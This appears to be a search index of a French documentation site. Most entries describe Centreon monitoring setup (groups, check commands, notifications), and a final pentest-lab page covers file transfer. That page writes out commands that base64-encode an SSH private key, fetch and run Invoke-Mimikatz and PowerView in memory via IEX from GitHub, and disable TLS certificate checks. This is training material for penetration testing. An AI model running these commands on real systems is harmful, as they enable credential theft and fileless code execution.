uniquement dans la partie monitoring des h\u00f4tes.  </p> <p>En cliquant sur un service ou un host, une vue d\u00e9taill\u00e9e appara\u00eet avec des raccourcis vers quelques actions d'exploitation et la configuration de l'objet s\u00e9lectionn\u00e9.  </p> <p></p>"},{"location":"supervision/Centreon/Configuration/#groupes","title":"Groupes","text":"<p>Les groupes, de services ou d'h\u00f4tes, vont permettre de regrouper nos objets par diff\u00e9rentes s\u00e9mantiques. Dans le cas des h\u00f4tes, nous pourrions par exemple les rassembler en fonction de la technique (Serveur Windows, Linux, etc.), par site g\u00e9ographique, etc. Le services eux pourront \u00eatre rassembl\u00e9s pour regrouper par exemple tous les services cl\u00e9s \u00e0 la fourniture de l'intranet de l'entreprise.  </p> <p>Ensuite, ces groupes sont principalement utilis\u00e9s dans l'interface de supervision \u00e0 des fins de statistiques, \u00e9tat des lieux, etc. C\u00f4t\u00e9 configuration, une fois cr\u00e9\u00e9s, ils ne peuvent malheureusement \u00eatre d\u00e9clar\u00e9s uniquement sur l'objet lui-m\u00eame (h\u00f4te ou service) et non dans les Templates.  </p>"},{"location":"supervision/Centreon/Configuration/#categories","title":"Cat\u00e9gories","text":"<p>Les cat\u00e9gories vont permettre de regrouper les h\u00f4tes ou services par cat\u00e9gories et seront ensuite utilis\u00e9es pour g\u00e9rer les droits d'acc\u00e8s dans l'application Centreon Elles apportent \u00e9galement des fonctions suppl\u00e9mentaires utilis\u00e9es par les produits payants Centreon que nous ne verrons pas. Contrairement aux groupes, les cat\u00e9gories supportent l'h\u00e9ritage. Il est donc conseill\u00e9 de les d\u00e9finir au niveau des mod\u00e8les d'h\u00f4tes et de services.  </p>"},{"location":"supervision/Centreon/commandes_supervision/","title":"Commandes","text":""},{"location":"supervision/Centreon/commandes_supervision/#les-commandes-de-supervision","title":"Les commandes de supervision","text":"<p>Le moteur de supervision a pour r\u00f4le de lancer des commandes de supervision \u00e0 intervalles r\u00e9guliers (par d\u00e9faut toutes les 5 min).  </p> <p>Une des premi\u00e8res \u00e9tapes dans la mise en place de supervision sera de d\u00e9finir ces ommandes qui permettront de faire nos v\u00e9rifications, qu'on appelle \u00e9galement \"checks\".  </p>"},{"location":"supervision/Centreon/commandes_supervision/#commandes-de-verification","title":"Commandes de v\u00e9rification","text":"<p>Chaque h\u00f4te pourra \u00eatre associ\u00e9s \u00e0 diff\u00e9rents services. Par exemple, une charge CPU, consommation m\u00e9moire, d\u00e9bit sur une interface r\u00e9seau, etc. La v\u00e9rification de ces h\u00f4tes et services va n\u00e9cessiter l'ex\u00e9cution d'une commande qu'on appellera sonde de supervision dans ce contexte. En fonction de ce que l'on souhaitera superviser, nous avons \u00e0 notre disposition un ensemble de binaire/script issu des historiques \"Nagios-plugins\" ou des modernes \"Centreon-plugins\" en Perl.  </p>"},{"location":"supervision/Centreon/commandes_supervision/#ou-les-trouver","title":"Ou les trouver ?","text":"<p>Elles se trouvent dans 2 \"jeux\" de commandes :  </p> <ul> <li>Les commandes Nagios (Nagios Plugins), commandes historiques de Nagios \u00e0 installer (par paquets de la distribution), on les retrouve dans <code>/usr/lib64/nagios/plugins</code> </li> <li>Les commandes Centreon Plugins, installable via les \"plugin pack\", on les retrouve dans <code>/usr/lib/Centreon/plugins</code> <ul> <li>Il existe une multitude de plugins packs, certains sont gratuits, d'autres payants.  </li> </ul> </li> </ul>"},{"location":"supervision/Centreon/commandes_supervision/#fonctionnement","title":"Fonctionnement","text":"<p>Sur chacun des h\u00f4tes et services que nous superviserons sera associ\u00e9e une commande de v\u00e9rification. L'ex\u00e9cution de cette commande, notre check, aura pour objectif de d\u00e9terminer un statut. C'est ensuite ce statut qui permettra de d\u00e9terminer l'\u00e9tat de notre h\u00f4te ou service. Pour d\u00e9terminer ce statut, le moteur de supervision (Centreon-Engine) \u00e0 l'origine de la commande de v\u00e9rification lira le code retour de la commande.  </p> <p>Prenons l'exemple de la v\u00e9rification du service CPU d'un h\u00f4te lambda. Une commande est associ\u00e9e \u00e0 ce service :  </p> <ol> <li>Le moteur de supervision r\u00e9cup\u00e8re la commande et l'ex\u00e9cute  </li> <li>La commande s'ex\u00e9cute et proc\u00e8de \u00e0 diff\u00e9rentes interrogations et traitements  </li> <li>Le moteur de supervision r\u00e9cup\u00e8re le code retour et en d\u00e9termine un statut  </li> <li>C'est ce statut qui lui permettra d'entrependre des actions que l'on verra plus tard  </li> </ol>"},{"location":"supervision/Centreon/commandes_supervision/#les-statuts","title":"Les statuts","text":"<p>Pour un H\u00f4te </p> <p></p> <p>Pour un Service </p> <p></p>"},{"location":"supervision/Centreon/commandes_supervision/#ecrire-des-sondes","title":"Ecrire des sondes","text":""},{"location":"supervision/Centreon/commandes_supervision/#sondes-nagios","title":"Sondes Nagios","text":"<p>On retrouve les sondes dans le r\u00e9pertoire <code>/usr/lib64/nagios/plugins</code> Chaque sonde a le param\u00e8tre <code>-h</code> (obtenir de l'aide, \u00e0 lire) D'autres options communes comme <code>-c</code> (seuil CRITICAL) et <code>-w</code> (seuil WARNING)  </p> <p>Une fois ex\u00e9cut\u00e9e, une commande va retourner :  </p> <ul> <li>Des informations textuelles qu'on pourra visualiser depuis l'interface de supervision  </li> <li>Des donn\u00e9es de performance qui permettront d'alimenter des graphiques  </li> <li>Un code de retour pour permettre au moteur de supervision de d\u00e9terminer un statut  </li> </ul>"},{"location":"supervision/Centreon/commandes_supervision/#plugins-snmp","title":"Plugins SNMP","text":"<p>Celles-ci ce trouve \u00e0 l'emplacement <code>/usr/lib/Centreon/plugins</code> Tri\u00e9s par domaine  </p>"},{"location":"supervision/Centreon/commandes_supervision/#plugins-nrpe","title":"Plugins NRPE","text":"<p>Le plugin NRPE se trouve \u00e0 l'emplacement suivant : <code>/usr/lib/nagios/plugins</code> et se nomme check_centreon_nrpe3 (le num\u00e9ro 3 correspond au num\u00e9ro de version)  </p>"},{"location":"supervision/Centreon/installation_centreon/","title":"Installation","text":""},{"location":"supervision/Centreon/installation_centreon/#installation-centreon","title":"Installation Centreon","text":""},{"location":"supervision/Centreon/installation_centreon/#architecture-et-installation","title":"Architecture et installation","text":"<p>Pour installer Centreon, il existe plusieurs solutions :  </p> <ul> <li>Utiliser l'ISO Centreon  </li> <li>A partir des paquets (CentOS, Rocky Linux, Oracle Linux)  </li> <li>A partir d'une VM  </li> <li>A partir des sources  </li> </ul> <p>Les deux premi\u00e8res m\u00e9thodes sont les plus conseill\u00e9es Liens :  </p> <ul> <li>Lien officiel </li> </ul> <p>Centreon est compos\u00e9 des \u00e9l\u00e9ments suivants :  </p> <ul> <li>Le moteur de supervision et ordonnanceur de t\u00e2ches  </li> <li>Une base de donn\u00e9es  </li> <li>Une interface graphique web  </li> <li>Des modules/sondes, appel\u00e9s \"plugins\", fournis de base  </li> </ul> <p>Contrairement \u00e0 beaucoup d'autres outils de supervision, Centreon ne dispose pas de m\u00e9canismes internes pour v\u00e9rifier l'\u00e9tat d'une machine, d'un service, etc... Il utilise un ensemble de plugins qui ne sont rien de plus que des commandes externes qu'on appellera sondes de supervision. Ces programmes peuvent \u00eatre d\u00e9velopp\u00e9s sous  diff\u00e9rents langages.  </p> <p></p>"},{"location":"supervision/Centreon/installation_centreon/#pre-requis","title":"Pr\u00e9-requis","text":"<ul> <li>Une machine debian 11  </li> <li>Un acc\u00e8s internet  </li> <li>R\u00f4le <code>sudo</code> ou <code>root</code> </li> </ul>"},{"location":"supervision/Centreon/notifications/","title":"Notifications","text":""},{"location":"supervision/Centreon/notifications/#actions-dexploitation","title":"Actions d'exploitation","text":""},{"location":"supervision/Centreon/notifications/#acquittement-et-commentaires","title":"Acquittement et commentaires","text":"<p>Lorsqu'une alerte a lieu, il sera possible de l'acquitter et d'y ajouter un commentaire. Ca permettra d'indiquer que l'h\u00f4te ou le service qui est en erreur est bien pris en compte. Lors d'un acquittement les notifications, sauf si elles sont configur\u00e9es comme devant \u00eatre r\u00e9p\u00e9t\u00e9es, seront alors d\u00e9sactiv\u00e9es et l'alerte n'appara\u00eetra plus dans les listes des alertes non acquitt\u00e9es.  </p> <p>Lors de l'acquittement d'un h\u00f4te, il sera possible de le propager \u00e0 tous ses services qui risquent eux aussi d'\u00eatre en \u00e9tat d'alerte  </p> <p></p> <p>Le service ou l'host apparait sur fond jaune  </p> <p></p>"},{"location":"supervision/Centreon/notifications/#downtime-temps-darret","title":"Downtime : Temps d'arr\u00eat","text":"<p>A l'aide de ces temps d'arr\u00eat, nous aurons la possibilit\u00e9 de faire en sorte que Centreon arr\u00eate momentan\u00e9ment la supervision des h\u00f4tes et service associ\u00e9s sur des p\u00e9riodes programm\u00e9es en d\u00e9sactivant les notifications.  </p> <p>Il existe 2 types de temps d'arr\u00eat :  </p> <ul> <li>Le fixe aura pour caract\u00e9ristique une heure de d\u00e9but et de fin apr\u00e8s quoi les notifications reprendront.  </li> </ul> <p></p> <ul> <li>Le glissant aura une intervalle horaire de d\u00e9but et une dur\u00e9e. Il ne commencera seulement quand l'h\u00f4te ou le service passera \u00e0 un \u00e9tat autre qu'OK pour une dur\u00e9e pr\u00e9cise.  </li> </ul> <p>Il s'agit de la mani\u00e8re la plus optimale pour attribuer un temps d'arr\u00eat qui va correspondre au plus pr\u00e8s de l'op\u00e9ration de maintenance.  </p> <p></p>"},{"location":"supervision/Centreon/notifications/#controle-immediat-dun-service","title":"Contr\u00f4le imm\u00e9diat d'un service","text":"<p>Depuis l'interface de supervision des h\u00f4tes ou services, on pourra lancer un contr\u00f4le imm\u00e9diat ou imm\u00e9diat forc\u00e9. Le contr\u00f4le imm\u00e9diat prendra compte de la p\u00e9riode de contr\u00f4le d\u00e9finie sur l'h\u00f4te ou le service et donc ne donnera rien si nous sommes en dehors. Le contr\u00f4le imm\u00e9diat forc\u00e9 a la particularit\u00e9 de passer outre :  </p> <ul> <li>C'est la raison pour laquelle on va le privil\u00e9gier</li> </ul>"},{"location":"supervision/Centreon/notifications/#notifications","title":"Notifications","text":"<p>L'objectif d'une strat\u00e9gie de notification est d'alerter les bonnes personnes au bon moment et de la bonne mani\u00e8re. Quand un statut va passer en HARD, une alerte est g\u00e9n\u00e9r\u00e9e en interne dans NAGIOS/CENTREON et va enclencher un ensemble de v\u00e9rifications. Cette alerte pourra ensuite \u00eatre envoy\u00e9e \u00e0 un ou plusieurs contacts ou groupes de contacts.  </p> <p>Il est important de veiller \u00e0 g\u00e9rer intelligemment les flux d'alertes car trop d'information tue l'information ! Seules les personnes disponibles et en charge de la gestion du probl\u00e8mes seront \u00e0 cibler. A la fois sur les h\u00f4tes comme pour les services, l'utilisation des mod\u00e8les permet de g\u00e9n\u00e9rer un h\u00e9ritage sur les comportements des alertes.  </p>"},{"location":"supervision/Centreon/notifications/#methode-denvoi-des-alertes","title":"M\u00e9thode d'envoi des alertes","text":"<p>Par d\u00e9faut, la m\u00e9thode de notification pr\u00e9f\u00e9r\u00e9e de Centreon est le courriel. Aper\u00e7u de la commande <code>host-notify-by-email</code> </p> <p></p> <p>Il est cependant possible de le configurer pour envoyer tout autre type de messages (SMS, t\u00e9l\u00e9phone, syslog, etc.). Apr\u00e8s que Centreon ait r\u00e9cup\u00e9r\u00e9 la liste de tous les contacts devant \u00eatre notifi\u00e9s, ce sont des commandes de notification qu'il utilisera : tout comme les commandes de v\u00e9rification.  </p>"},{"location":"supervision/Centreon/notifications/#relation-parents-enfants","title":"Relation parents-enfants","text":"<p>Lorsqu'un service passe en critique sur un h\u00f4te, Centreon va d'abord v\u00e9rifier l'\u00e9tat de l'h\u00f4te afin de ne pas envoyer autant de notification qu'il y a de service associ\u00e9s \u00e0 l'h\u00f4te s'il est DOWN. De plus, si la supervision de plusieurs hosts d\u00e9pend d'un autre host qui lui-m\u00eame d\u00e9pend d'un autre etc,etc. Il sera possible de mettre en place du Network Outage en d\u00e9clarant des relations parents/enfants entre les hosts. Ainsi, si un host devient DOWN, Centreon v\u00e9rifiera l'\u00e9tat de son parent et si lui est DOWN, dans ce cas, l'enfant ne sera pas DOWN, mais UNREACHABLE et seul le parent pourra \u00eatre notifi\u00e9. A savoir qu'il est \u00e9galement possible de notifier pour le statut UNREACHABLE.  </p> <p>Les points cl\u00e9s du r\u00e9seau qui en cas de panne provoquent d'importants probl\u00e8mes, voire l'arr\u00eat du syst\u00e8me, seront appel\u00e9s des SPOF (Single Point Of Failure). Il conviendra de les identifier afin de mettre en place les relations parents/enfants. Lors de l'impl\u00e9mentation d'un serveur de supervision, il faudra veiller \u00e0 limiter le nombre de Network Outage en r\u00e9duisant la taille du plus grand chemin.  </p>"},{"location":"supervision/Centreon/notifications/#comportement-des-alertes","title":"Comportement des alertes","text":"<p>Lors d'un changement de statut d'un h\u00f4te, ou service, et qu'une alerte, par exemple par mail s'en suit, on pourra faire en sorte que la notification ne soit envoy\u00e9e qu'une ou plusieurs fois \u00e0 intervalle r\u00e9gulier. En cas d'envoi r\u00e9guliers, c'est l'acquittement de l'alerte qui stoppera les notifications suivantes. De plus, on pourra mettre en place un syst\u00e8me d'escalade d'alerte. En cas de non-prise en compte d'une alerte par un acquittement, au lieu que les notifications soient toujours envoy\u00e9es aux m\u00eames personnes, d'autre personnes les recevront.  </p>"},{"location":"supervision/Centreon/notifications/#workflow-de-notification","title":"Workflow de notification","text":"<p>Afin de d\u00e9bugger tout probl\u00e8me de notification dans son environnement de supervision, il est important de conna\u00eetre les diff\u00e9rentes \u00e9tapes entre la v\u00e9rification d'un service/h\u00f4te et sa notification.  </p> <p>S'assurer que le statut de l'h\u00f4te, ou service, est bien en HARD. Le statut SOFT n'enclenche pas le moteur de notification. Est-ce que les notifications sont activ\u00e9es dans la configuration du service/h\u00f4te ou de ses templates ? Est-ce que l'h\u00f4te/service est dans un temps d'arr\u00eat programm\u00e9 ? Est-ce que la Notification Period configur\u00e9e sur l'h\u00f4te ou le service permet la notification ? Pour le statut en cours, les notifications sont-elles configur\u00e9es ?  </p> <p>R\u00e9cup\u00e9ration de tous les contacts \u00e0 notifier et pour chacun d'eux :  </p> <ul> <li>Est-ce que les notifications sont activ\u00e9es pour le contact ?  </li> <li>Est-ce que la p\u00e9riode de notification du contact lui permet de recevoir une notification ?  </li> <li>Est-ce que le contact est configur\u00e9 pour recevoir une notification pour le statut actuel ?  </li> <li>La notification est envoy\u00e9e au contact avec la commande adapt\u00e9e ?  </li> </ul> <p></p>"},{"location":"tp/transfert%20de%20fichier/","title":"Le transfert de fichier","text":""},{"location":"tp/transfert%20de%20fichier/#powershell-base64-decode-encode","title":"Powershell base64 d\u00e9code encode","text":"<p>Check de la cl\u00e9 ssh en hash md5</p> <p>freeeee@htb[/htb]$ md5sum id_rsa</p> <p>4e301756a07ded0a2dd6953abf015278  id_rsa</p> <p>Encodage de la cl\u00e9 en base64</p> <p>freeeee@htb[/htb]$ cat id_rsa |base64 -w 0;echo</p> <p>LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K...</p> <p>Nous pouvons copier ce contenu et le coller dans une borne Windows PowerShell et utiliser certaines fonctions PowerShell pour le d\u00e9coder.</p> <p>PS C:\\htb&gt; [IO.File]::WriteAllBytes(\"C:\\Users\\Public\\id_rsa\", [Convert]::FromBase64String(\"LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K...</p> <p>Enfin, nous pouvons confirmer si le fichier a \u00e9t\u00e9 transf\u00e9r\u00e9 avec succ\u00e8s \u00e0 l'aide du Get-FileHash cmdlet, qui fait la m\u00eame chose que md5sum fait.</p> <pre><code>PS C:\\htb&gt; Get-FileHash C:\\Users\\Public\\id_rsa -Algorithm md5\n\nAlgorithm       Hash                            Path\n---------       ----                            ----\nMD5      4E301756A07DED0A2DD6953ABF015278        C:\\Users\\Public\\id_rsa\n</code></pre>"},{"location":"tp/transfert%20de%20fichier/#telechargements-web-powershell","title":"T\u00e9l\u00e9chargements Web PowerShell","text":"<p>PowerShell propose de nombreuses options de transfert de fichiers. Dans n'importe quelle version de PowerShell, le System.Net.WebClient la classe peut \u00eatre utilis\u00e9e pour t\u00e9l\u00e9charger un fichier sur HTTP, HTTPS ou FTP. Les \u00e9l\u00e9ments suivants table d\u00e9crit les m\u00e9thodes WebClient pour t\u00e9l\u00e9charger des donn\u00e9es \u00e0 partir d'une ressource:</p> Method Description OpenRead Renvoie les donn\u00e9es d'une ressource en tant que Flux. OpenReadAsync Renvoie les donn\u00e9es d'une ressource sans bloquer le thread appelant. DownloadData T\u00e9l\u00e9charge les donn\u00e9es d'une ressource et renvoie un tableau d'octets. DownloadDataAsync T\u00e9l\u00e9charge les donn\u00e9es d'une ressource et renvoie un tableau d'octets sans bloquer le thread appelant. DownloadFile T\u00e9l\u00e9charge les donn\u00e9es d'une ressource vers un fichier local. DownloadFileAsync T\u00e9l\u00e9charge les donn\u00e9es d'une ressource vers un fichier local sans bloquer le thread appelant. DownloadString T\u00e9l\u00e9charge une cha\u00eene \u00e0 partir d'une ressource et renvoie une cha\u00eene. DownloadStringAsync T\u00e9l\u00e9charge une cha\u00eene \u00e0 partir d'une ressource sans bloquer le fil appelant."},{"location":"tp/transfert%20de%20fichier/#methode-powershell-downloadfile","title":"M\u00e9thode PowerShell DownloadFile","text":"<p>Nous pouvons sp\u00e9cifier le nom de la classe Net.WebClient et la m\u00e9thode DownloadFile avec les param\u00e8tres correspondant \u00e0 l'URL du fichier cible \u00e0 t\u00e9l\u00e9charger et le nom du fichier de sortie.</p> <pre><code>PS C:\\htb&gt; # Example: (New-Object Net.WebClient).DownloadFile('&lt;Target File URL&gt;','&lt;Output File Name&gt;')\nPS C:\\htb&gt; (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\\Users\\Public\\Downloads\\PowerView.ps1')\n\nPS C:\\htb&gt; # Example: (New-Object Net.WebClient).DownloadFileAsync('&lt;Target File URL&gt;','&lt;Output File Name&gt;')\nPS C:\\htb&gt; (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1')\n</code></pre>"},{"location":"tp/transfert%20de%20fichier/#powershell-downloadstring-methode-sans-fichier","title":"PowerShell DownloadString - M\u00e9thode sans fichier","text":"<p>Comme nous l'avons vu pr\u00e9c\u00e9demment, les attaques sans fichier fonctionnent en utilisant certaines fonctions du syst\u00e8me d'exploitation pour t\u00e9l\u00e9charger la charge utile et l'ex\u00e9cuter directement. PowerShell peut \u00e9galement \u00eatre utilis\u00e9 pour effectuer des attaques sans fichier. Au lieu de t\u00e9l\u00e9charger un script PowerShell sur disque, nous pouvons l'ex\u00e9cuter directement en m\u00e9moire \u00e0 l'aide du Invoke-Expression cmdlet ou l'alias IEX.</p> <p><pre><code>PS C:\\htb&gt; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')\n</code></pre> IEX accepte \u00e9galement les entr\u00e9es de pipeline.</p> <pre><code>PS C:\\htb&gt; (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX\n</code></pre>"},{"location":"tp/transfert%20de%20fichier/#powershell-invoke-webrequest","title":"PowerShell Invoke-WebRequest","text":"<p>\u00c0 partir de PowerShell 3.0, le Invoke-WebRequest cmdlet est \u00e9galement disponible, mais il est nettement plus lent \u00e0 t\u00e9l\u00e9charger des fichiers. Vous pouvez utiliser les alias iwr, curl, et wget au lieu de la Invoke-WebRequest nom complet.</p> <pre><code>PS C:\\htb&gt; Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1\n</code></pre> <p>https://gist.github.com/HarmJ0y/bb48307ffa663256e239</p>"},{"location":"tp/transfert%20de%20fichier/#erreurs-courantes-avec-powershell","title":"Erreurs courantes avec PowerShell","text":"<p>Il peut y avoir des cas o\u00f9 la configuration de la premi\u00e8re lancement d'Internet Explorer n'est pas termin\u00e9e, ce qui emp\u00eache le t\u00e9l\u00e9chargement.</p> <p></p> <p>Cela peut \u00eatre contourn\u00e9 \u00e0 l'aide du param\u00e8tre -UseBasicParsing.</p> <pre><code>PS C:\\htb&gt; Invoke-WebRequest https://&lt;ip&gt;/PowerView.ps1 | IEX\n\nInvoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.\nAt line:1 char:1\n+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException\n+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand\n\nPS C:\\htb&gt; Invoke-WebRequest https://&lt;ip&gt;/PowerView.ps1 -UseBasicParsing | IEX\n</code></pre> <p>Une autre erreur dans les t\u00e9l\u00e9chargements PowerShell est li\u00e9e au canal s\u00e9curis\u00e9 SSL / TLS si le certificat n'est pas fiable. Nous pouvons contourner cette erreur avec la commande suivante:</p> <pre><code>PS C:\\htb&gt; IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')\n\nException calling \"DownloadString\" with \"1\" argument(s): \"The underlying connection was closed: Could not establish trust\nrelationship for the SSL/TLS secure channel.\"\nAt line:1 char:1\n+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : WebException\nPS C:\\htb&gt; [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\n</code></pre>"},{"location":"tp/transfert%20de%20fichier/#telechargements-smb","title":"T\u00e9l\u00e9chargements SMB","text":""}]}